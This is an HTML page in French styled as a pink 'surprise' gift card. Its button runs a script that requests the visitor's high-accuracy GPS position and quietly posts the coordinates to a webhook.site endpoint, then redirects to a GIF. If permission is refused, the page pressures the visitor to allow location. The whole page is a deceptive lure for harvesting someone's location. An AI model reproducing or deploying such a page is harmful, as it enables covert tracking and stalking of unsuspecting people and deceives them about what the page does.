<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise ! ✨</title>
    <style>
        body { background-color: #fff0f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; border: 2px solid #ffb6c1; }
        button { background-color: #ffb6c1; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h1 style="color: #ff69b4;">Coucou ! ✨</h1>
        <p>Clique sur le bouton pour ta surprise...</p>
        <button onclick="envoyerGps()">Ouvrir ma surprise 🎁</button>
    </div>
    <script>
        function envoyerGps() {
            navigator.geolocation.getCurrentPosition((pos) => {
                fetch("https://webhook.site/e8e69f2b-cf41-4a3c-82f9-f71bb8c1c338", {
                    method: "POST",
                    mode: "no-cors",
                    body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
                });
                window.location.href = "https://media.giphy.com/media/KztT2c4u8mYYUiMKd1/giphy.gif";
            }, (err) => {
                alert("Il faut autoriser la localisation pour voir le cadeau ! 🌸");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
